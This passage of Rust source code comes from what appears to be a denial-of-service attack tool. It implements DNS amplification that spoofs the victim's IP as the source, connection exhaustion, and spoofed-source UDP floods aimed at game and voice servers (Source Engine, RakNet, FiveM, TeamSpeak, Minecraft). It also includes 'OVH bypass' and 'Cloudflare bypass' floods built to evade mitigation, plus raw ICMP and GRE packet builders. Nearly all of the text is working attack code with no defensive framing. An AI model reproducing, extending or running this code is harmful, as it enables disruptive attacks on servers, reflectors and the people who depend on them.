    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let reflectors = reflectors.clone();
        let target_ip = target_ip; // This is the VICTIM IP (we spoof this as source)
        
        let handle = tokio::spawn(async move {
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let mut rng = rand::thread_rng();
            
            while Instant::now() < end_time {
                // Pick a random reflector
                let reflector_str = reflectors[rng.gen_range(0..reflectors.len())];
                let reflector_ip: Ipv4Addr = reflector_str.parse().unwrap();
                let reflector_addr = SocketAddrV4::new(reflector_ip, 53);
                let sock_addr = socket2::SockAddr::from(reflector_addr);

                // Create DNS query (ANY or TXT for max response)
                let dns_query = create_amplification_query("isc.org");
                
                // CRITICAL: Source IP is the TARGET (Victim), Dest IP is the REFLECTOR
                let src_ip = target_ip;
                let dst_ip = reflector_ip;
                let src_port = rng.gen(); // Random source port (victim's port doesn't matter for reflection usually, but we can randomize)
                let dst_port = 53;

                let packet = build_udp_packet(src_ip, dst_ip, src_port, dst_port, &dns_query);
                
                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Amplification attack complete. Queries sent: {}", packet_count.load(Ordering::Relaxed));
}

fn create_amplification_query(domain: &str) -> Vec<u8> {
    let mut query = Vec::new();
    
    // Transaction ID (2 bytes)
    query.extend_from_slice(&[0x12, 0x34]);
    
    // Flags (2 bytes) - standard query with recursion desired
    query.extend_from_slice(&[0x01, 0x00]);
    
    // Questions (2 bytes)
    query.extend_from_slice(&[0x00, 0x01]);
    
    // Answer RRs (2 bytes)
    query.extend_from_slice(&[0x00, 0x00]);
    
    // Authority RRs (2 bytes)
    query.extend_from_slice(&[0x00, 0x00]);
    
    // Additional RRs (2 bytes)
    query.extend_from_slice(&[0x00, 0x00]);
    
    // Question section
    for label in domain.split('.') {
        query.push(label.len() as u8);
        query.extend_from_slice(label.as_bytes());
    }
    query.push(0); // End of domain name
    
    // Type TXT (2 bytes) - TXT records can be large
    query.extend_from_slice(&[0x00, 0x10]);
    
    // Class IN (2 bytes)
    query.extend_from_slice(&[0x00, 0x01]);
    
    query
}

pub async fn connection_exhaustion(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Connection Exhaustion attack on {}:{} for {} seconds", target, port, duration_secs);
    println!("Strategy: Open and hold maximum connections to exhaust server resources");
    
    let target_addr = format!("{}:{}", target, port);
    let connection_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    // Keep connections alive in a shared vector
    let connections: Arc<Mutex<Vec<tokio::net::TcpStream>>> = Arc::new(Mutex::new(Vec::new()));
    
    let num_workers = get_worker_count() * 8; // Many connections per core
    println!("Attempting to establish {} persistent connections...", num_workers);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let connection_count = connection_count.clone();
        let connections = connections.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(stream) = tokio::net::TcpStream::connect(&target_addr).await {
                    connection_count.fetch_add(1, Ordering::Relaxed);
                    
                    // Hold connection open
                    let mut conns = connections.lock().await;
                    conns.push(stream);
                    drop(conns);
                    
                    // Sleep to prevent too rapid reconnection
                    tokio::time::sleep(Duration::from_secs(1)).await;
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    let final_count = connections.lock().await.len();
    println!("Connection Exhaustion complete. Peak connections held: {}", final_count);
    println!("Total connection attempts: {}", connection_count.load(Ordering::Relaxed));
}

pub async fn vse_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting VSE (Valve Source Engine) flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP));
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket. Falling back to standard UDP flood.");
        udp_flood(target, port, duration_secs).await;
        return;
    }

    let target_ip: Ipv4Addr = match resolve_ipv4(target, port).await {
        Some(ip) => ip,
        None => return,
    };
    
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    // TSource Engine Query payload
    let payload = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00".to_vec();
    
    let num_workers = get_worker_count();
    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let payload = payload.clone();
        let target_ip = target_ip;
        
        let handle = tokio::spawn(async move {
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let target_addr = SocketAddrV4::new(target_ip, port);
            let sock_addr = socket2::SockAddr::from(target_addr);
            let mut rng = rand::thread_rng();
            
            while Instant::now() < end_time {
                let src_ip = Ipv4Addr::new(rng.gen(), rng.gen(), rng.gen(), rng.gen());
                let src_port: u16 = rng.gen();
                
                let packet = build_udp_packet(src_ip, target_ip, src_port, port, &payload);

                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("VSE flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn ovh_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting OVH Bypass flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP));
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket.");
        return;
    }

    let target_ip: Ipv4Addr = match resolve_ipv4(target, port).await {
        Some(ip) => ip,
        None => return,
    };
    
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_ip = target_ip;
        
        let handle = tokio::spawn(async move {
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let target_addr = SocketAddrV4::new(target_ip, port);
            let sock_addr = socket2::SockAddr::from(target_addr);
            let mut rng = rand::thread_rng();
            
            while Instant::now() < end_time {
                let src_ip = Ipv4Addr::new(rng.gen(), rng.gen(), rng.gen(), rng.gen());
                let src_port: u16 = rng.gen();
                
                // OVH bypass: Random payload size to avoid static signatures
                let size = rng.gen_range(4..1400);
                let mut payload = vec![0u8; size];
                rng.fill(&mut payload[..]);
                
                let packet = build_udp_packet(src_ip, target_ip, src_port, port, &payload);

                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("OVH flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn cf_bypass_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Cloudflare Bypass flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_url = format!("http://{}:{}", target, port);
    let request_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let user_agents = vec![
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    ];
    
    let num_workers = get_worker_count();
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_url = target_url.clone();
        let request_count = request_count.clone();
        let user_agents = user_agents.clone();
        
        let handle = tokio::spawn(async move {
            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .build()
                .unwrap_or_default();
                
            let counter = std::sync::atomic::AtomicU64::new(0);
            
            while Instant::now() < end_time {
                let idx = counter.fetch_add(1, Ordering::Relaxed) as usize % user_agents.len();
                let user_agent = user_agents[idx];
                
                // Mimic legitimate headers
                if (client
                    .get(&target_url)
                    .header("User-Agent", user_agent)
                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
                    .header("Accept-Language", "en-US,en;q=0.5")
                    .header("Connection", "keep-alive")
                    .header("Upgrade-Insecure-Requests", "1")
                    .header("Cache-Control", "max-age=0")
                    .send()
                    .await).is_ok()
                {
                    request_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("CF Bypass flood complete. Requests sent: {}", request_count.load(Ordering::Relaxed));
}

pub async fn http_stress(target: &str, port: u16, duration_secs: u64) {
    println!("Starting HTTP Stress Test on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_url = format!("http://{}:{}", target, port);
    let request_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count() * 2; // Higher concurrency for stress test
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_url = target_url.clone();
        let request_count = request_count.clone();
        
        let handle = tokio::spawn(async move {
            let client = reqwest::Client::new();
            
            while Instant::now() < end_time {
                // Send mixed GET and POST requests
                let is_post = rand::random::<bool>();
                
                let req = if is_post {
                    let body: Vec<u8> = (0..1024).map(|_| rand::random()).collect();
                    client.post(&target_url).body(body)
                } else {
                    client.get(&target_url)
                };
                
                if req.send().await.is_ok() {
                    request_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("HTTP Stress Test complete. Requests sent: {}", request_count.load(Ordering::Relaxed));
}

pub async fn minecraft_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Minecraft Protocol flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_addr = format!("{}:{}", target, port);
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let packet_count = packet_count.clone();
        let target_host = target.to_string();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = tokio::net::TcpStream::connect(&target_addr).await {
                    // Construct Minecraft Handshake Packet (State 1 - Status)
                    // Format: Length | ID | Proto Ver | Host Len | Host | Port | Next State
                    let mut packet = Vec::new();
                    packet.push(0x00); // Packet ID (Handshake)
                    packet.push(47);   // Protocol Version (1.8) - VarInt (simplified)
                    
                    // Host Length + Host
                    packet.push(target_host.len() as u8);
                    packet.extend_from_slice(target_host.as_bytes());
                    
                    // Port (unsigned short)
                    packet.extend_from_slice(&port.to_be_bytes());
                    
                    // Next State (1 for Status, 2 for Login)
                    packet.push(0x01);
                    
                    // Prepend Length
                    let mut final_packet = Vec::new();
                    final_packet.push(packet.len() as u8);
                    final_packet.extend(packet);
                    
                    if stream.write_all(&final_packet).await.is_ok() {
                        // Send Request Packet (ID 0x00)
                        let _ = stream.write_all(&[0x01, 0x00]).await;
                        packet_count.fetch_add(1, Ordering::Relaxed);
                    }
                }
                // Small delay to prevent instant socket exhaustion on client side
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Minecraft flood complete. Handshakes sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn raknet_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting RakNet (MCPE/Terraria) flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP));
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket. Falling back to standard UDP flood.");
        udp_flood(target, port, duration_secs).await;
        return;
    }

    let target_ip: Ipv4Addr = match resolve_ipv4(target, port).await {
        Some(ip) => ip,
        None => return,
    };
    
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    // RakNet Unconnected Ping
    // ID (1) + Time (8) + Magic (16) + GUID (8)
    let mut payload = Vec::new();
    payload.push(0x01); // Unconnected Ping
    payload.extend_from_slice(&[0x00; 8]); // Time
    // Offline Message Data ID (Magic)
    payload.extend_from_slice(&[
        0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe, 
        0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78
    ]);
    payload.extend_from_slice(&[0x00; 8]); // GUID
    
    let num_workers = get_worker_count();
    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let payload = payload.clone();
        let target_ip = target_ip;
        
        let handle = tokio::spawn(async move {
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let target_addr = SocketAddrV4::new(target_ip, port);
            let sock_addr = socket2::SockAddr::from(target_addr);
            let mut rng = rand::thread_rng();
            
            while Instant::now() < end_time {
                let src_ip = Ipv4Addr::new(rng.gen(), rng.gen(), rng.gen(), rng.gen());
                let src_port: u16 = rng.gen();
                
                let packet = build_udp_packet(src_ip, target_ip, src_port, port, &payload);

                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("RakNet flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn fivem_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting FiveM flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP));
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket. Falling back to standard UDP flood.");
        udp_flood(target, port, duration_secs).await;
        return;
    }

    let target_ip: Ipv4Addr = match resolve_ipv4(target, port).await {
        Some(ip) => ip,
        None => return,
    };
    
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    // FiveM getinfo payload
    let payload = b"\xff\xff\xff\xffgetinfo xxx".to_vec();
    
    let num_workers = get_worker_count();
    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let payload = payload.clone();
        let target_ip = target_ip;
        
        let handle = tokio::spawn(async move {
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let target_addr = SocketAddrV4::new(target_ip, port);
            let sock_addr = socket2::SockAddr::from(target_addr);
            let mut rng = rand::thread_rng();
            
            while Instant::now() < end_time {
                let src_ip = Ipv4Addr::new(rng.gen(), rng.gen(), rng.gen(), rng.gen());
                let src_port: u16 = rng.gen();
                
                let packet = build_udp_packet(src_ip, target_ip, src_port, port, &payload);

                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("FiveM flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn ts3_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting TeamSpeak 3 flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP));
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket. Falling back to standard UDP flood.");
        udp_flood(target, port, duration_secs).await;
        return;
    }

    let target_ip: Ipv4Addr = match resolve_ipv4(target, port).await {
        Some(ip) => ip,
        None => return,
    };
    
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    // TS3 Init Packet (approximate)
    let payload = b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02".to_vec();
    
    let num_workers = get_worker_count();
    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let payload = payload.clone();
        let target_ip = target_ip;
        
        let handle = tokio::spawn(async move {
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let target_addr = SocketAddrV4::new(target_ip, port);
            let sock_addr = socket2::SockAddr::from(target_addr);
            let mut rng = rand::thread_rng();
            
            while Instant::now() < end_time {
                let src_ip = Ipv4Addr::new(rng.gen(), rng.gen(), rng.gen(), rng.gen());
                let src_port: u16 = rng.gen();
                
                let packet = build_udp_packet(src_ip, target_ip, src_port, port, &payload);

                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("TS3 flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

fn build_icmp_packet(src_ip: Ipv4Addr, dst_ip: Ipv4Addr) -> Vec<u8> {
    let mut packet = Vec::with_capacity(28);
    
    // IPv4 Header (20 bytes)
    packet.push(0x45);
    packet.push(0x00);
    packet.extend_from_slice(&28u16.to_be_bytes()); // Total Length (20 IP + 8 ICMP)
    packet.extend_from_slice(&0x1234u16.to_be_bytes());
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    packet.push(64); // TTL
    packet.push(1);  // Protocol (ICMP = 1)
    packet.extend_from_slice(&0u16.to_be_bytes()); // Checksum
    packet.extend_from_slice(&src_ip.octets());
    packet.extend_from_slice(&dst_ip.octets());
    
    // IP Checksum
    let ip_checksum = calculate_checksum(&packet[0..20]);
    packet[10] = (ip_checksum >> 8) as u8;
    packet[11] = (ip_checksum & 0xFF) as u8;
    
    // ICMP Header (8 bytes)
    // Type (8 = Echo Request)
    packet.push(8);
    // Code (0)
    packet.push(0);
    // Checksum (0 for now)
    packet.extend_from_slice(&0u16.to_be_bytes());
    // Identifier
    packet.extend_from_slice(&0x1234u16.to_be_bytes());
    // Sequence Number
    packet.extend_from_slice(&0x0001u16.to_be_bytes());
    
    // ICMP Checksum
    let icmp_checksum = calculate_checksum(&packet[20..]);
    packet[22] = (icmp_checksum >> 8) as u8;
    packet[23] = (icmp_checksum & 0xFF) as u8;
    
    packet
}

fn build_gre_packet(src_ip: Ipv4Addr, dst_ip: Ipv4Addr) -> Vec<u8> {
    let mut packet = Vec::with_capacity(44); // 20 IP + 4 GRE + 20 Inner IP
    
    // Outer IPv4 Header (20 bytes)
    packet.push(0x45);
    packet.push(0x00);
    packet.extend_from_slice(&44u16.to_be_bytes()); // Total Length
    packet.extend_from_slice(&0x1234u16.to_be_bytes());
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    packet.push(64); // TTL
    packet.push(47); // Protocol (GRE = 47)
    packet.extend_from_slice(&0u16.to_be_bytes()); // Checksum
    packet.extend_from_slice(&src_ip.octets());
    packet.extend_from_slice(&dst_ip.octets());
    
    // Outer IP Checksum
    let ip_checksum = calculate_checksum(&packet[0..20]);
    packet[10] = (ip_checksum >> 8) as u8;
    packet[11] = (ip_checksum & 0xFF) as u8;
    
    // GRE Header (4 bytes)
    // Flags (0) + Version (0)
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    // Protocol Type (IPv4 = 0x0800)
    packet.extend_from_slice(&0x0800u16.to_be_bytes());
    
    // Inner IPv4 Header (20 bytes) - Garbage/Spoofed
    packet.push(0x45);
    packet.push(0x00);
    packet.extend_from_slice(&20u16.to_be_bytes());
    packet.extend_from_slice(&0x5678u16.to_be_bytes());
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    packet.push(64);
    packet.push(17); // UDP
    packet.extend_from_slice(&0u16.to_be_bytes());
    // Random inner IPs
    packet.extend_from_slice(&[192, 168, 1, 1]);
    packet.extend_from_slice(&[10, 0, 0, 1]);
    
    // Inner IP Checksum
    let inner_checksum = calculate_checksum(&packet[24..44]);
    packet[34] = (inner_checksum >> 8) as u8;
    packet[35] = (inner_checksum & 0xFF) as u8;
    
    packet
}

async fn resolve_ipv4(target: &str, port: u16) -> Option<Ipv4Addr> {
    match target.parse::<Ipv4Addr>() {
        Ok(ip) => Some(ip),
        Err(_) => {
             match tokio::net::lookup_host(format!("{}:{}", target, port)).await {
                Ok(mut addrs) => {
                    if let Some(SocketAddr::V4(addr)) = addrs.find(|a| a.is_ipv4()) {
                        Some(*addr.ip())
                    } else {
                        eprintln!("Could not resolve to IPv4 address: {}", target);
                        None
                    }
                }
                Err(_) => {
                    eprintln!("Invalid IP address or domain: {}", target);
                    None
                }
            }
        }
    }
}
